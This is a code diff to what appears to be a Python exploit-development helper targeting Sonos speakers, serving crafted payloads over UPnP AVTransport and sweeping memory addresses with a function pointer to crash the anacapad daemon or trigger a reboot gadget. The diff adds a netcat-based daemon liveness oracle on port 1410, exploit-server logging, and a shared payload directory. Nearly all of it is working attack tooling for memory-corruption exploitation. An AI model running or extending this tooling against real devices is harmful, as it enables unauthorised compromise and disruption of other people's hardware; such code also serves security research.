@@ -4,6 +4,9 @@ session runners (sweepshell/sweepdb/diagfire). Stdlib only. Every device-touchin
 function takes an explicit device IP."""
 import subprocess, threading, http.server, socketserver, os, time, re, urllib.request
 
+_HERE = os.path.dirname(os.path.abspath(__file__))
+PAYLOAD_DIR = os.path.join(_HERE, "..", "sweep2")
+
 SVC = "urn:schemas-upnp-org:service:AVTransport:1"
 PROTO = "http-get:*:audio/aac:*"   # default; protocol_info() prefers the device's own Sink list
 # 2026-11-20: the PI is build-specific and matters. 57.23 lists `audible` and answers Play 200
@@ -61,7 +64,12 @@ def _server(host, port, payload_dir):
             data = open(p, "rb").read() if os.path.exists(p) else b"x"
             self.send_response(200); self.send_header("Content-Length", str(len(data)))
             self.end_headers(); self.wfile.write(data)
-        def log_message(self, *a): pass
+        def log_message(self, fmt, *a):
+            try:
+                with open("/tmp/sonos-exploit-server.log", "a") as fh:
+                    fh.write(time.strftime("%H:%M:%S ") + (fmt % a) + "\n")
+            except Exception:
+                pass
     socketserver.TCPServer.allow_reuse_address = True
     t = threading.Thread(target=lambda: socketserver.TCPServer((host, port), H).serve_forever(), daemon=True)
     t.start(); return t
@@ -95,6 +103,14 @@ def alive(device, timeout=1.5):
     return False
 
 
+def daemon_up(device, timeout=1):
+    """Liveness of the *daemon* rather than of the HTTP status server: 1410 is anacapad's own
+    watchdog socket (1410 open on 57.23-83121 while /setstring no longer kills the daemon, so the
+    status server can outlive a crash and every /status-based oracle is suspect)."""
+    r = subprocess.run(["nc", "-z", "-G", str(timeout), device, "1410"], capture_output=True)
+    return r.returncode == 0
+
+
 def play_until(device, tries=6, pause=0.6):
     """Play is a race on the current builds: 701 until the renderer has opened the stream.
     Retry until it accepts; a fire is only armed once Play returns 200 (2026-11-20)."""
@@ -115,7 +131,7 @@ def icmp_ok(device):
     return " 0% packet loss" in r.stdout
 
 def fire_and_watch(device, payload_name, S, host=None, port=8981,
-                   payload_dir="recon/tnzm_audible/sweep2", ports=(), watch_s=100, log=print):
+                   payload_dir=PAYLOAD_DIR, ports=(), watch_s=100, log=print):
     """Two-stage fire: benign stage1 + payload, then watch ports + ICMP/HTTP."""
     host = host or local_host(device)
     proto = protocol_info(device)
@@ -145,8 +161,8 @@ def fire_and_watch(device, payload_name, S, host=None, port=8981,
     return verdict, opened
 
 def calibrate(device, lo=0x700000, hi=0x71c000, step=0x400, host=None,
-              port=8982, payload_dir="recon/tnzm_audible/sweep2", fn=0x51000000, log=print,
-              watch=6.0, settle=0.0):
+              port=8982, payload_dir=PAYLOAD_DIR, fn=0x51000000, log=print,
+              watch=6.0, settle=0.0, daemon_oracle=False):
     """Band sweep. FN=0x51000000 (unmapped) => daemon crash; FN=<reboot gadget> => box reboot.
     A fire is only armed once Play returns 200 (the 2026-11-20 race)."""
     from sonos_exploit import build
@@ -171,7 +187,8 @@ def calibrate(device, lo=0x700000, hi=0x71c000, step=0x400, host=None,
         down = 0; maxd = 0; t0 = time.time()
         while time.time() - t0 < watch:
             time.sleep(0.2)
-            if not alive(device, 0.8):
+            up = daemon_up(device) if daemon_oracle else alive(device, 0.8)
+            if not up:
                 down += 1; maxd = max(maxd, down)
             else:
                 if down >= 3: break
